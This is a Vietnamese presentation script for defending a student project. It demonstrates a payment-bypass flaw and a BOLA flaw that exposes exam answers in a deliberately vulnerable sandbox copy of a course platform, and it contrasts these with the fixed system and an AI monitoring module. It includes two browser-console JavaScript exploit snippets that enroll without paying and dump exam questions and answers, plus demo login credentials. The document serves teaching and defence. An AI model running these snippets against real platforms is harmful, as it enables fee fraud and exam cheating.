# KỊCH BẢN THUYẾT TRÌNH BẢO VỆ ĐỒ ÁN — SANDBOX DEMO LỖ HỔNG & BẠCH TUỘC AI SENTINEL

> **Thư mục Sandbox**: `PWD301_demo_bug/`  
> **Hệ thống**: PPTQ Course & Assessment Platform  
> **Mục tiêu**: Trình diễn trước Hội đồng 2 lỗ hổng bảo mật phổ biến (Bypass thanh toán học phí qua API & BOLA/IDOR xem trước đề thi trong phòng chờ) và khả năng ứng phó phòng thủ tự động bằng **Bạch Tuột, trợ lí AI của hệ thống PPTQ** (Sentinel Heuristics + Gemini Risk Scoring 95/100 + Realtime SSE Alert).

---

## 🎯 DEMO 1: LỖ HỔNG BYPASS THANH TOÁN HỌC PHÍ TRỰC TIẾP (DIRECT API ENROLLMENT) & PHẢN ỨNG CỦA BẠCH TUỘC AI SENTINEL

### 1. Bối cảnh & Điểm yếu
- **Hiện tượng**: Khóa học có thiết lập học phí (ví dụ 500,000 VNĐ). Trên giao diện người dùng, nút bấm yêu cầu nạp ví hoặc quét mã QR VietQR.
- **Lỗ hổng (Flaw)**: Kẻ tấn công mở DevTools (F12) và gửi lệnh `POST /student/courses/<course_id>/enroll` mà không qua cổng thanh toán `api_payments`.
- **Cơ chế phòng thủ của hệ thống**: Bạch Tuột AI Sentinel phát hiện học sinh enroll khóa học `price > 0` mà không có mã thanh toán/giao dịch ví, tính toán **Risk Score: 95/100 (CRITICAL)**, ghi nhận `AuditEvent` chống chối bỏ vào CSDL, và lập tức phát thông báo khẩn cấp màu đỏ tới Admin Cockpit qua Server-Sent Events (SSE).

### 2. Thao tác Demo thực chiến trên DevTools Console (F12)
1. Đăng nhập tài khoản Học viên trên trình duyệt: `student1@example.com` / `StudentPass123!`.
2. Mở trình duyệt thứ 2 (hoặc tab ẩn danh khác) đăng nhập tài khoản Quản trị viên (Admin): `admin@example.com` / `AdminPass123!`.
3. Tại tab Học viên, mở DevTools bằng phím `F12` $\rightarrow$ chọn tab **Console**.
4. Dán đoạn mã sau và nhấn **Enter**:

```javascript
// [DEMO 1]: Học sinh gửi request trực tiếp bypass thanh toán học phí
(async () => {
  // Lấy ID khóa học có phí đang xem
  const courseId = location.hash.split('/').pop().split('?')[0] || '1';
  console.log("%c[EXPLOIT] Đang gửi payload bypass thanh toán trực tiếp...", "color: red; font-size: 14px; font-weight: bold;");
  
  const res = await fetch(`/student/courses/${courseId}/enroll`, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'X-CSRFToken': (document.cookie.match(/csrf_token=([^;]+)/) || [])[1] || ''
    }
  });
  
  const data = await res.json();
  console.log("%c[RESULT] Kết quả trả về từ máy chủ:", "color: yellow; font-size: 13px;", data);
})();
```

### 3. Kết quả Quan sát & Lời thuyết trình trước Hội đồng
- **Tại màn hình Học sinh**: Console nhận kết quả và giao diện được mở khóa.
- **Tại màn hình Admin (Live Threat Stream)**: Lập tức xuất hiện Toast cảnh báo màu đỏ:
  `🚨 [BẠCH TUỘT AI SENTINEL] Phát hiện gian lận! Nguyễn Văn A bypass học phí môn CS101 (500,000đ)!`
- **Lời thuyết trình**:
  > *"Kính thưa Hội đồng, ở phiên bản chưa nâng cấp hoặc khi kẻ tấn công tìm cách gọi API trực tiếp để lách giao diện thanh toán, hệ thống chính PWD301 đã áp dụng Luật Sắt 402 Payment Required ở tầng Controller. Đồng thời, module Bạch Tuột AI Sentinel độc lập giám sát toàn bộ dòng dữ liệu, phát hiện độ vênh giữa trạng thái ghi danh và lịch sử thanh toán ví/VietQR để gửi cảnh báo đỏ tức thì tới Quản trị viên theo thời gian thực."*

---

## 🎯 DEMO 2: LỖ HỔNG BOLA / LỘ CẤU TRÚC ĐỀ THI & ĐÁP ÁN TRONG PHÒNG CHỜ THI (WAITING ROOM EXPLOIT)

### 1. Bối cảnh & Điểm yếu
- **Hiện tượng**: Học sinh vào phòng chờ thi (Waiting Room) chưa bấm nút "Bắt đầu làm bài" (chưa khởi tạo `AssessmentAttempt` và chưa bắt đầu tính giờ làm bài).
- **Lỗ hổng (Flaw)**: Trang phòng chờ gọi API `GET /student/assessments/<id>` để lấy thông tin thời gian thi, số câu hỏi. Nếu backend trả về cấu trúc câu hỏi và danh sách đáp án (`full=True, include_answers=True`), học sinh có thể dùng DevTools xem trước toàn bộ đề và đáp án trước khi bấm bắt đầu tính giờ thi!

### 2. Thao tác Demo thực chiến trên DevTools Console (F12)
1. Học sinh truy cập vào phòng chờ một bài thi bất kỳ (ví dụ URL `#/student/assessments/<assessment_id>/waiting-room`).
2. Mở tab **Console** của DevTools (F12).
3. Dán đoạn mã sau và nhấn **Enter**:

```javascript
// [DEMO 2]: Học sinh khai thác BOLA để đọc trộm đề thi và đáp án đúng trước khi tính giờ
(async () => {
  const assessmentId = location.hash.split('/')[3];
  console.log(`%c[EXPLOIT BOLA] Đang đọc trộm đề thi ${assessmentId} từ phòng chờ...`, "color: red; font-size: 14px; font-weight: bold;");
  
  const res = await fetch(`/student/assessments/${assessmentId}`);
  const data = await res.json();
  
  console.log("%c[LỘ ĐỀ THI] Toàn bộ câu hỏi và đáp án thu thập được:", "color: #00ff00; font-size: 13px;", data);
  if (data.questions && data.questions.length > 0) {
    console.table(data.questions.map((q, i) => ({
      "Câu": i + 1,
      "Nội dung": q.stem || q.prompt || q.content,
      "Đáp án đúng": (q.choices || []).find(c => c.is_correct)?.text || 'Xem chi tiết',
      "Điểm": q.points || 1
    })));
  }
})();
```

### 3. Kết quả Quan sát & Lời thuyết trình trước Hội đồng
- **Tại màn hình Console**: Toàn bộ bảng câu hỏi và đáp án đúng hiện ra rõ ràng trên Console bảng `console.table`.
- **So sánh với Hệ thống Chính PWD301**:
  > *"Trên hệ thống chính PWD301, lỗ hổng BOLA này đã được triệt tiêu hoàn toàn nhờ cơ chế phân quyền Zero-Trust tại `get_assessment_detail`: Khi thí sinh chưa bắt đầu làm bài, API bắt buộc trả về `full=False, include_answers=False`, chỉ hiển thị thông tin tối giản (Tên bài thi, thời lượng, số câu, quy chế thi). Cấu trúc câu hỏi chỉ được sinh và cấp phát thông qua Attempt Lease có chữ ký bảo mật một phiên duy nhất khi đồng hồ bắt đầu đếm ngược."*

---

## 🛡️ TỔNG KẾT SO SÁNH GIỮA HAI PHIÊN BẢN

| Hạng mục kiểm thử | Phiên bản Demo (`PWD301_demo_bug`) | Hệ thống Chính (`PWD301`) |
| :--- | :--- | :--- |
| **Bypass thanh toán học phí qua API** | Chấp nhận ghi danh $\rightarrow$ Kích hoạt Bạch Tuộc AI Sentinel + Cảnh báo đỏ SSE | **Chặn đứng ngay lập tức (HTTP 402 Payment Required)** |
| **Xem trước đề thi phòng chờ (BOLA)** | Trả về `full=True` lộ câu hỏi và đáp án | **Ẩn 100% câu hỏi (`full=False`), chỉ trả về tiêu đề và thời lượng** |
| **Kiểm soát tua video bài giảng** | Có thể tua tự do | **Pacing Engine khóa tua quá frontier; chỉ mở tua tự do 5 giây cuối** |
| **Chống Race Condition ví tiền** | Trừ tiền tuần tự không khóa | **Bi quan `with_for_update()` khóa dòng số dư người dùng** |
